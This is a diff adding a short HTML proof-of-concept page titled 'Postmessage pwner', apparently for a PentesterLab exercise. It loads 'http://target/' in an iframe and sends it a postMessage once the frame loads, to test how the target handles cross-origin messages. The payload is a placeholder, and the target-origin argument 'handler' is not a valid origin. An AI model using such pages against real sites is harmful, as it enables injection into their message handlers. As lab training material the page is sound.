@@ -1,0 +1,24 @@
+<html> 
+
+<body>
+    
+    <h2>Postmessage pwner</h2>
+        <iframe src='http://target/' id='pentesterlab' onload=submit()></iframe>
+    <script>
+
+        
+        function submit(){
+
+            var wn = document.getElementById('pentesterlab').contentWindow;
+            setTimeout(function() {
+            wn.postMessage('message', 'handler');
+            }, 1000);
+            
+        }
+        
+       
+       
+    </script>
+</body>
+
+</html>
